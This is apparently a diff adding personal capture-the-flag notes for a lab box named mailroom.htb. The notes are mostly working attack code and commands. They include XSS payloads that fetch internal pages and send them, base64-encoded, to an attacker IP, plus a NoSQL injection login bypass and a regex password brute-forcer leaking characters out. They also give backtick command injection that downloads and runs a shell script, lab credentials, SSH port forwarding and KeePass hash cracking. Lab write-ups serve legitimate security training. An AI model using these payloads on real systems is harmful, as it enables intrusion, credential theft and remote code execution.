@@ -1,0 +1,118 @@
+Within the contact form, the message can be XXS (cross site script attack)
+
+the git subdomain : Gitea Version: 1.18.0 : matthew has a repo
+
+mongodb://mongodb:27017 {
+    "require": {
+        "mongodb/mongodb": "^1.15"
+    }
+}
+
+We can use https://reqbin.com/code/javascript/wzp2hxwh/javascript-post-request-example (XMLHttpRequest)
+to send requests to localhost and grab information ==> When we do gets on ourselves with iframe we can see
+both the target and ourselves hitting the URL!
+
+<script>
+var url = "http://staff-review-panel.mailroom.htb/index.php";
+var attacker = "http://10.10.14.6:80/";
+var xhr  = new XMLHttpRequest();
+
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+xhr.open('GET', url, true);
+xhr.send(null);
+</script>
+
+// This allows us to nosql inject the login
+<script>
+var http = new XMLHttpRequest();
+var url = 'http://staff-review-panel.mailroom.htb/auth.php';
+var attacker = "http://10.10.14.6:80/";
+
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+var params = 'email[$ne]=1&password[$ne]=1';
+
+http.onload = function() {
+    fetch(attacker + "?b64=" + encodeURI(btoa(http.responseText)));
+}
+
+http.send(params);
+</script>
+
+We can find valid emails by refering back to http://mailroom.htb/about.php this is due to the fact
+we can assume the emails are lower case firstname @ mailroom.htb
+			LIST OF POSSIBLE EMAILS
+{ tristan@mailroom.htb, matthew@mailroom.htb, chris@mailroom.htb, vivien@mailroom.htb }
+
+Due to us dealing with PHP and NOSQL we can attempt using REGEX to brute force discover passwords!
+
+// This allows us to brute force the pass
+<script>
+var charList = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~";
+var attacker = "http://10.10.14.6:80/?pass=";
+
+function brutePass(pass) {
+	var http = new XMLHttpRequest();
+	var url = 'http://staff-review-panel.mailroom.htb/auth.php';
+
+	http.open('POST', url, true);
+	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	
+	http.onload = function() {
+	    if (/"success":true/.test(this.responseText)) {
+	    	displayToAttack(pass);
+	    	sendAttempt(charList, pass);
+	    }
+	}
+	
+	http.send("email=tristan@mailroom.htb&password[$regex]=^"+pass);
+}
+
+function displayToAttack(pass) { fetch(attacker+pass); }
+
+function sendAttempt(chars, pass) {
+	for (var i = 0; i < chars.length; i++) {
+		brutePass(pass+chars[i])
+	}
+}
+
+sendAttempt(charList, "");
+</script>
+
+After a lot of force modifying to the password, the server gives us this : 69trisRulez!
+
+tristan@mailroom.htb:69trisRulez! -> SSH Creds
+
+ssh -L 8080:127.0.0.1:80 tristan@mailroom.htb ==> Port Forward with SSH
+
+We could go into matthews home and view some files
+
+keepass2john SecretDB.kdbx > Keepasshash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+
+We can forward the port 80 so we can go into the forbidden subdomain, and looking back at the source code
+they are using shell_exec(), this could be a target for an RCE
+
+php -S 127.0.0.1:9001 -> do in mailroom dir
+
+`curl "http://10.10.14.6:80"` -> gets us a ping on the http.server due to ` not being filtered
+
+`curl "http://10.10.14.6:80/shell.sh" --output /tmp/shell.sh`
+`chmod +x /tmp/shell.sh`
+`bash /tmp/shell.sh` -> shell hit from www-data
+
+When we hit as www-data we are in a docker container, the site is hosted off of the main machine!
+
+staff dir has a GIT page -> GITS CONTAIN CREDS ==> FIND THE .GIT
+
+matthew:HueLover83%23 => gitea creds from config ==> %23 is url encode for #
+
+matthew:HueLover83#
+
+================================================================================
+
+/usr/bin/perl /usr/bin/kpcli -> interface for viewing keepass files
